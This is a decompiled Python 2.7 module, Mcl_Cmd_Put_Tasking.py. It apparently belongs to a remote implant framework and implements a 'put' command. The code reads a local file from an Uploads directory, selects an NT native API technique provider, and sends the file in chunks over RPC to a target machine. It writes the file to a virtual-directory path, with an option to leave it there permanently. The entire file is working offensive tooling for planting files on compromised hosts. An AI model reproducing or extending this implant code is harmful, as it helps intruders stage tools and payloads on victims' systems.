# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Put_Tasking.py
UPLOADS_DIR = 'Uploads'
MAX_CHUNK_SIZE = 1047552

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.env
    import mcl.tasking.resource
    import mcl.tasking.technique
    import mcl.tasking.virtualdir
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.put', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.put.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['chunksize'] == 0 or lpParams['chunksize'] >= MAX_CHUNK_SIZE:
        mcl.tasking.OutputError('Invalid chunkSize given')
        return False
    else:
        provider = mcl.tasking.technique.Lookup('PUT', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, lpParams['method'])
        if lpParams['source'] == None or len(lpParams['source']) == 0:
            mcl.tasking.OutputError('No local file given')
            return False
        local = lpParams['source']
        if lpParams['remote'] == None or len(lpParams['remote']) == 0:
            if local.find('\\') != -1 or local.find('/') != -1:
                mcl.tasking.OutputError('You must specify a remote file name if you specify a path for the local file')
                return False
            remote = local
        else:
            remote = lpParams['remote']
        resFlags = 0
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_ARCH
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_OS
        resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_LIBC
        if lpParams['compiled']:
            resFlags |= mcl.tasking.resource.OPEN_RES_FLAG_USE_COMPILED
        f, openedName, usedProject = mcl.tasking.resource.Open(local, resFlags, UPLOADS_DIR, lpParams['project'])
        if f == None:
            mcl.tasking.OutputError("Failed to open local file '%s'" % local)
            return False
        try:
            import os.path
            import array
            fileSize = os.path.getsize(openedName)
            if fileSize == 0 or fileSize > 4294967295L:
                mcl.tasking.OutputError("Invalid file size (%u) for put of '%s'" % (fileSize, openedName))
                return False
            taskXml = mcl.tasking.Tasking()
            taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, provider)
            mcl.tasking.OutputXml(taskXml.GetXmlObject())
            from mcl.object.XmlOutput import XmlOutput
            xml = XmlOutput()
            xml.Start('PutFile')
            xml.AddAttribute('name', openedName)
            xml.AddAttribute('size', '%u' % fileSize)
            mcl.tasking.OutputXml(xml)
            fileBytes = array.array('B', f.read())
            if len(fileBytes) != fileSize:
                mcl.tasking.OutputError('Failed to read file (read=%u | expected=%u)' % (len(fileBytes), fileSize))
                return False
            mcl.tasking.env.SetValue(mca.file.cmd.put.LP_ENV_PUT_COMPLETE, 'false')
            mcl.tasking.env.SetValue(mca.file.cmd.put.LP_ENV_BYTES_LEFT, '%u' % fileSize)
            mcl.tasking.env.SetValue(mca.file.cmd.put.LP_ENV_FILE_SIZE, '%u' % fileSize)
            mcl.tasking.env.SetValue(mca.file.cmd.put.LP_ENV_FILE_OPENED, 'false')
            mcl.tasking.env.SetValue(mca.file.cmd.put.LP_ENV_ERROR_ENCOUNTERED, 'false')
        finally:
            f.close()
            f = None

        createParams = mca.file.cmd.put.CreateParams()
        createParams.writeOffset = 0
        createParams.provider = provider
        if lpParams['permanent']:
            createParams.flags |= mca.file.cmd.put.PARAMS_CREATE_FLAG_PERMANENT
        try:
            createParams.filePath = mcl.tasking.virtualdir.GetFullPath(remote)
        except:
            mcl.tasking.OutputError('Failed to apply virtual directory to remote name')
            return False

        rpc = mca.file.cmd.put.tasking.RPC_INFO_CREATE
        msg = MarshalMessage()
        createParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.file.cmd.put.errorStrings)
            return False
        import time
        while not mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_FILE_OPENED):
            if mcl.CheckForStop() or mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_ERROR_ENCOUNTERED):
                return False
            time.sleep(1)

        chunkIndex = 0
        bytesLeft = fileSize
        while bytesLeft > 0:
            if mcl.CheckForStop() or mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_ERROR_ENCOUNTERED):
                return False
            numBytesToSend = bytesLeft
            if numBytesToSend > lpParams['chunksize']:
                numBytesToSend = lpParams['chunksize']
            startIndex = fileSize - bytesLeft
            endIndex = startIndex + numBytesToSend
            writeParams = mca.file.cmd.put.WriteParams()
            writeParams.data = fileBytes[startIndex:endIndex]
            writeParams.chunkIndex = chunkIndex
            if numBytesToSend >= bytesLeft:
                writeParams.lastData = True
            chunkIndex = chunkIndex + 1
            rpc = mca.file.cmd.put.tasking.RPC_INFO_WRITE
            msg = MarshalMessage()
            writeParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
            rpc.SetMessagingType('message')
            res = mcl.tasking.RpcPerformCall(rpc)
            if res != mcl.target.CALL_SUCCEEDED:
                mcl.tasking.RecordModuleError(res, 0, mca.file.cmd.put.errorStrings)
                return False
            newBytesLeft = bytesLeft
            while newBytesLeft == bytesLeft:
                if mcl.CheckForStop() or mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_ERROR_ENCOUNTERED):
                    return False
                time.sleep(1)
                newBytesLeft = int(mcl.tasking.env.GetValue(mca.file.cmd.put.LP_ENV_BYTES_LEFT))

            bytesLeft = newBytesLeft

        while not mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_PUT_COMPLETE):
            if mcl.CheckForStop() or mcl.tasking.env.IsTrue(mca.file.cmd.put.LP_ENV_ERROR_ENCOUNTERED):
                return False
            time.sleep(1)

        if not lpParams['permanent']:
            mcl.tasking.TaskGoToBackground()
            while not mcl.CheckForStop():
                time.sleep(1)

        return mcl.tasking.TaskSetStatus(mcl.target.CALL_SUCCEEDED)


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)